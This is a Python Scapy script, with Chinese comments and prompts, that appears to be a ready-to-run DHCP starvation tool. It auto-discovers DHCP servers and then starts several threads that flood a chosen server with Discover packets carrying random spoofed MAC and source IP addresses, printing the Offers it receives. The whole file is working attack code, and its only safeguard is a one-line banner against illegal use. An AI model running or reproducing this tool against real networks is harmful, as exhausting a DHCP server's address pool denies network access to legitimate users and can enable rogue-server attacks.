from scapy.all import srp, IP, UDP, Ether, BOOTP, DHCP, conf
import random
import threading
import time
import signal  # 用于捕获Ctrl+C信号
import ipaddress  # 新增：校验IP合法性

# 全局禁用Scapy默认日志，避免干扰输出
conf.verb = 0
# 全局变量：标记程序是否需终止（用于子线程判断）
should_terminate = False

def generate_fake_ip(fake_ip_segment):
    """生成虚假源IP（基于指定网段，确保格式合法）"""
    # 修复：强制校验网段格式，确保以小数点结尾
    if not fake_ip_segment.endswith('.'):
        fake_ip_segment += '.'  
    # 生成最后一段（2-254，避免0和255）
    last_octet = random.randint(2, 254)  
    # 拼接成完整IP
    fake_ip = f"{fake_ip_segment}{last_octet}"  
    # 额外校验（防止极端情况，如用户输入非法网段前缀）
    if not is_valid_ip(fake_ip):
        raise ValueError(f"生成非法IP：{fake_ip}（网段前缀：{fake_ip_segment}）")
    return fake_ip

def generate_fake_mac():
    """生成随机虚假MAC地址"""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ":".join(f"{x:02x}" for x in mac)

def is_valid_ip(ip_str):
    """校验是否为合法IPv4地址"""
    try:
        ipaddress.IPv4Address(ip_str)
        return True
    except ipaddress.AddressValueError:
        return False

def auto_search_dhcp(timeout=3):
    """自动搜索附近DHCP服务器（支持Ctrl+C中断搜索）"""
    print(f"\n=== 开始自动搜索DHCP服务器（超时{timeout}秒，按Ctrl+C可中断）===")
    dhcp_servers = set()
    discover_pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=generate_fake_mac()) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=bytes.fromhex(generate_fake_mac().replace(":", "")), xid=random.getrandbits(32)) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    try:
        # 发送探测包（超时前可被Ctrl+C中断）
        _, received = srp(discover_pkt, timeout=timeout, verbose=0)
        if received and not should_terminate:  # 未终止时才解析响应
            for pkt in received:
                response = pkt[1]
                if DHCP in response and BOOTP in response:
                    dhcp_type = next((opt[1] for opt in response[DHCP].options if opt[0] == "message-type"), None)
                    if dhcp_type == "offer":
                        server_ip = response[IP].src
                        dhcp_servers.add(server_ip)
                        print(f"✅ 发现DHCP服务器：{server_ip}")
    except KeyboardInterrupt:
        print("\n🔚 搜索被用户（Ctrl+C）中断")
        return []  # 中断后返回空列表，进入手动填IP流程

    if not dhcp_servers and not should_terminate:
        print("❌ 未搜索到任何DHCP服务器（检查网络或延长超时）")
    return list(dhcp_servers)

def send_and_process_dhcp(thread_name, target_ip, fake_ip_segment, send_interval, recv_timeout):
    """单个线程逻辑（实时检查终止标记，支持Ctrl+C强制停止）"""
    print(f"\n线程 {thread_name} 启动：目标DHCP服务器={target_ip}（按Ctrl+C终止）")
    try:
        while not should_terminate:  # 核心：终止标记为True时立即退出循环
            # 1. 生成虚假客户端参数（带合法性校验）
            try:
                fake_src_ip = generate_fake_ip(fake_ip_segment)
                fake_mac = generate_fake_mac()
            except ValueError as e:
                print(f"[{thread_name}] 生成参数失败：{e}，跳过本次循环")
                time.sleep(send_interval)
                continue  # 跳过非法参数，重试
            
            print(f"[{thread_name}] 虚假客户端：IP={fake_src_ip} | MAC={fake_mac}")

            # 2. 构造DHCP Discover报文
            fake_discover = (
                Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) /
                IP(src=fake_src_ip, dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(op=1, chaddr=bytes.fromhex(fake_mac.replace(":","")), xid=random.getrandbits(32)) /
                DHCP(options=[("message-type", "discover"), "end"])
            )

            # 3. 发送报文+接收响应（未终止时才执行）
            if not should_terminate:
                _, received = srp(fake_discover, timeout=recv_timeout, verbose=0)

                # 4. 处理Offer响应（未终止时才解析）
                if received and not should_terminate:
                    for pkt in received:
                        resp = pkt[1]
                        if DHCP in resp and BOOTP in resp:
                            dhcp_type = next((opt[1] for opt in resp[DHCP].options if opt[0] == "message-type"), None)
                            if dhcp_type == "offer":
                                assigned_ip = resp[BOOTP].yiaddr
                                subnet_mask = next((opt[1] for opt in resp[DHCP].options if opt[0] == "subnet_mask"), "未知")
                                print(f"[{thread_name}] 📩 收到Offer：")
                                print(f"    服务器IP：{resp[IP].src} | 分配IP：{assigned_ip} | 子网掩码：{subnet_mask}\n")
                else:
                    print(f"[{thread_name}] ⏳ {recv_timeout}秒内未收到响应\n")

            # 控制发送间隔（期间检查终止标记，避免阻塞）
            time.sleep(send_interval)
    except KeyboardInterrupt:
        pass  # 交由全局信号处理，避免重复捕获
    finally:
        print(f"\n[{thread_name}] 🔚 已强制停止")

def handle_ctrl_c(signal_num, frame):
    """Ctrl+C信号处理函数：设置终止标记，通知所有线程停止"""
    global should_terminate
    if not should_terminate:
        should_terminate = True
        print("\n\n=== 已触发Ctrl+C，正在强制终止所有线程... ===")

def main():
    # 注册Ctrl+C信号处理器（核心：捕获Ctrl+C并触发终止逻辑）
    signal.signal(signal.SIGINT, handle_ctrl_c)

    print("=== DHCP工具（自动搜索+Ctrl+C强制终止）===")
    print("=== 严禁非法操作 ===\n")

    # 步骤1：自动搜索DHCP服务器（支持Ctrl+C中断）
    dhcp_servers = auto_search_dhcp(timeout=3)
    if should_terminate:  # 若搜索时触发Ctrl+C，直接退出程序
        print("=== 程序已被用户强制终止 ===")
        return
    target_ip = ""

    # 步骤2：选择/输入目标IP（支持Ctrl+C中断）
    try:
        if dhcp_servers:
            print("\n请选择目标DHCP服务器（输入序号，按Ctrl+C终止）：")
            for idx, ip in enumerate(dhcp_servers, 1):
                print(f"  {idx}. {ip}")
            while not target_ip and not should_terminate:
                try:
                    choice = int(input("输入选择的序号：").strip())
                    if 1 <= choice <= len(dhcp_servers):
                        target_ip = dhcp_servers[choice-1]
                    else:
                        print(f"请输入1-{len(dhcp_servers)}之间的序号")
                except ValueError:
                    print("请输入有效的数字序号")
        else:
            target_ip = input("\n请手动输入目标IP（DHCP服务器IP/广播IP，按Ctrl+C终止）：").strip()
            # 手动输入时校验IP合法性
            while not is_valid_ip(target_ip) and not should_terminate:
                print(f"错误：{target_ip} 不是合法IPv4地址，请重新输入")
                target_ip = input("请手动输入目标IP（DHCP服务器IP/广播IP，按Ctrl+C终止）：").strip()
    except KeyboardInterrupt:
        print("\n=== 程序已被用户强制终止 ===")
        return
    if should_terminate:
        print("=== 程序已被用户强制终止 ===")
        return

    # 步骤3：输入其他配置（支持Ctrl+C中断）
    try:
        fake_ip_segment = input("输入虚假源IP网段（192.168.1.写前面那个，按Ctrl+C终止）：").strip()
        # 校验网段前缀格式（至少包含一个小数点）
        while "." not in fake_ip_segment and not should_terminate:
            print("错误：网段前缀需包含小数点（如192.168.1.），请重新输入")
            fake_ip_segment = input("输入虚假源IP网段（如192.168.1.，按Ctrl+C终止）：").strip()
        
        thread_num = int(input("输入线程数（建议1-3，按Ctrl+C终止）：").strip() or 2)
        send_interval = float(input("输入单线程发送间隔（秒，如0.3，按Ctrl+C终止）：").strip() or 0.3)
        recv_timeout = float(input("输入接收响应超时（秒，如1，按Ctrl+C终止）：").strip() or 1)
    except KeyboardInterrupt:
        print("\n=== 程序已被用户强制终止 ===")
        return
    if should_terminate:
        print("=== 程序已被用户强制终止 ===")
        return

    # 步骤4：启动多线程（支持Ctrl+C强制停止）
    print(f"\n=== 配置确认：目标IP={target_ip} | 线程数={thread_num} ===")
    print("=== 按 Ctrl+C 强制终止所有线程 ===")
    threads = []
    for i in range(thread_num):
        t = threading.Thread(
            target=send_and_process_dhcp,
            args=(f"Thread-{i+1}", target_ip, fake_ip_segment, send_interval, recv_timeout)
        )
        threads.append(t)
        t.start()

    # 主线程等待所有子线程（直到终止标记生效）
    for t in threads:
        t.join()
    print("\n=== 所有线程已终止，程序退出 ===")

if __name__ == "__main__":
    main()